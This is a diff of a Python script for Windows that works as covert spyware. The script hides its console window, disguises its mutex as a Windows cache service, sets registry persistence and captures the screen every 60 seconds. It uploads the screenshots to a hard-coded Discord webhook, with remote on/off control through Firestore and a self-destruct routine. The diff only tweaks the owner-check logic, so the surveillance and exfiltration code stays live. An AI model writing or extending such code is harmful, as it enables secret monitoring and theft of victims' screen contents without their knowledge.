@@ -11,14 +11,12 @@ import urllib.request
 import urllib.error
 import subprocess
 import winreg
-
 try:
     console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if console_hwnd:
         ctypes.windll.user32.ShowWindow(console_hwnd, 0)
 except Exception:
     pass
-
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 INTERVAL = 60
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
@@ -30,14 +28,12 @@ FIRESTORE_STATUS_URL = (
 )
 COMPUTER_NAME = socket.gethostname().upper()
 TARGET_NAME = "SK5X08-PC"
-
 try:
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
     if ctypes.windll.kernel32.GetLastError() == 183:
         sys.exit(0)
 except Exception:
     pass
-
 def find_pythonw():
     try:
         result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5, text=True)
@@ -49,7 +45,6 @@ def find_pythonw():
     except:
         pass
     return sys.executable
-
 def fetch_firebase_field(field_name, default="on"):
     try:
         req = urllib.request.Request(FIRESTORE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
@@ -63,7 +58,6 @@ def fetch_firebase_field(field_name, default="on"):
             return default
     except Exception:
         return default
-
 def self_destruct():
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -87,7 +81,6 @@ def self_destruct():
     except:
         pass
     sys.exit(0)
-
 def ensure_persistence():
     try:
         script_path = os.path.abspath(sys.argv[0])
@@ -99,7 +92,6 @@ def ensure_persistence():
         return True
     except Exception:
         return False
-
 def is_this_owner():
     username = os.environ.get("USERNAME", "").strip().upper()
     if username == "HAMDI":
@@ -107,24 +99,15 @@ def is_this_owner():
     me_txt = r"C:\Users\HAMDI\Documents\mybots\apps\me.txt"
     if os.path.exists(me_txt):
         return True
-    owner_fb = fetch_firebase_field("owner", "off")
-    if COMPUTER_NAME.upper() == TARGET_NAME.upper() and owner_fb == "on":
+    if COMPUTER_NAME.upper() == TARGET_NAME.upper():
         return True
     return False
-
 def should_send_screenshot():
-    try:
-        all_status = fetch_firebase_field("all", "on").lower()
-    except:
-        all_status = "on"
-    if COMPUTER_NAME.upper() == TARGET_NAME.upper():
-        if is_this_owner():
-            return True
-        else:
-            self_destruct()
-            return False
+    if is_this_owner():
+        owner_status = fetch_firebase_field("owner", "off").lower()
+        return owner_status == "on"
+    all_status = fetch_firebase_field("all", "on").lower()
     return all_status == "on"
-
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -170,7 +153,6 @@ def take_screenshot():
         return io.BytesIO(bmp_data)
     except Exception:
         return None
-
 def send_screenshot_to_discord(image_buffer):
     try:
         boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
@@ -192,7 +174,6 @@ def send_screenshot_to_discord(image_buffer):
             return resp.status == 200
     except Exception:
         return False
-
 def main_loop():
     ensure_persistence()
     while True:
@@ -204,7 +185,6 @@ def main_loop():
         except Exception:
             pass
         time.sleep(INTERVAL)
-
 if __name__ == "__main__":
     try:
         main_loop()
